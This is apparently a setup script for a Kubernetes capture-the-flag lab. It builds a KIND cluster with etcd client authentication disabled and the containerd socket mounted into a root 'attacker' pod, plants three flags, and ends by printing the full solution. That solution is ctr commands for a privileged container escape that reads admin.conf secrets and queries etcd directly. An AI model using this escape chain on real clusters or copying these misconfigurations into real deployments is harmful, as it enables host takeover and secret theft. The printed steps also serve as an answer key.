#!/bin/bash
set -euo pipefail
K8S_ID="chain21"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CLUSTER_NAME="cve-chain-cri-etcd"
source "$SCRIPT_DIR/../../scripts/k8s-common.sh"

echo "[Chain CRI-to-etcd] 3-step K8s attack chain"
echo "  K8S-16 (CRI Socket) -> K8S-06 (secrets from node shell) -> K8S-08 (etcd)"

# Prepare flags
FLAG_DIR="/home/kianabin/cve-flags/chain21"
mkdir -p "$FLAG_DIR"
FLAG1="${CVE_FLAG_1:-flag{chain21-step1-cri}}"
FLAG2="${CVE_FLAG_2:-flag{chain21-step2-rbac}}"
FLAG3="${CVE_FLAG_3:-flag{chain21-step3-etcd}}"
echo "$FLAG1" > "$FLAG_DIR/step1.txt"

echo "[*] Creating unified KIND cluster..."
kind create cluster --name "$CLUSTER_NAME" --config - << 'KINDCFG'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3
    extraMounts:
      - hostPath: /home/kianabin/cve-flags/chain21
        containerPath: /host-flag
    kubeadmConfigPatches:
      - |
        kind: ClusterConfiguration
        etcd:
          local:
            extraArgs:
              client-cert-auth: "false"
KINDCFG

echo "[*] Waiting for cluster stabilization..."
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10

docker pull alpine:latest 2>/dev/null
docker pull bitnami/kubectl:1.28 2>/dev/null
docker pull curlimages/curl:latest 2>/dev/null
kind load docker-image alpine:latest --name "$CLUSTER_NAME" 2>/dev/null || true
kind load docker-image bitnami/kubectl:1.28 --name "$CLUSTER_NAME" 2>/dev/null || true
kind load docker-image curlimages/curl:latest --name "$CLUSTER_NAME" 2>/dev/null || true

# Step 2 flag: kube-system secret readable only from a node shell (admin.conf)
kubectl create secret generic chain21-stage2 --from-literal=flag="$FLAG2" -n kube-system 2>/dev/null || true

# Step 3 final flag: custom etcd key (invisible to the Kubernetes API)
k8s_put_etcd_key "/chain21-final" "$FLAG3"

# Build CRI escape pod image with ctr
docker build -t chain21-cri-pod:local -f - "$SCRIPT_DIR" << 'DOCKERFILE' 2>/dev/null || \
  echo "  Using alpine as fallback (install ctr manually in pod)"
FROM alpine:latest
RUN apk add --no-cache curl && \
    curl -sSL https://github.com/containerd/containerd/releases/download/v1.7.13/containerd-1.7.13-linux-amd64.tar.gz | \
    tar xz -C /usr/local bin/ctr
DOCKERFILE
kind load docker-image chain21-cri-pod:local --name "$CLUSTER_NAME" 2>/dev/null || true

# Deploy CRI-accessible pod (NO hostPID, NO flag mount - the CRI escape is required)
kubectl apply -f - << YAML
apiVersion: v1
kind: Pod
metadata:
  name: chain21-pod
  namespace: default
spec:
  containers:
    - name: attacker
      image: chain21-cri-pod:local
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      securityContext:
        runAsUser: 0
      volumeMounts:
        - name: cri-sock
          mountPath: /run/containerd/containerd.sock
          readOnly: true
  volumes:
    - name: cri-sock
      hostPath:
        path: /run/containerd/containerd.sock
        type: Socket
YAML

echo "[*] Waiting for pod readiness..."
kubectl wait --for=condition=Ready pod/chain21-pod --timeout=60s 2>/dev/null || true
sleep 5

echo ""
echo "[Chain CRI-to-etcd] Ready"
echo "  Step 1: kubectl exec chain21-pod -- sh"
echo "    -> ctr -n k8s.io run --rm --privileged --mount type=bind,src=/host-flag,dst=/mnt,options=rbind:rw docker.io/library/alpine:latest escape cat /mnt/step1.txt"
echo "  Step 2: from an escaped container with host root + host network:"
echo "    -> ctr -n k8s.io run --rm --privileged --net-host --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/bitnami/kubectl:1.28 esc2 -- sh -c 'KUBECONFIG=/host/etc/kubernetes/admin.conf kubectl get secret chain21-stage2 -n kube-system -o jsonpath={.data.flag} | base64 -d'"
echo "  Step 3: ctr -n k8s.io run --rm --net-host docker.io/curlimages/curl:latest etcdcurl -- -sk -X POST https://127.0.0.1:2379/v3/kv/range -H 'Content-Type: application/json' -d '{\"key\":\"$(printf /chain21-final | base64 -w0)\"}'"
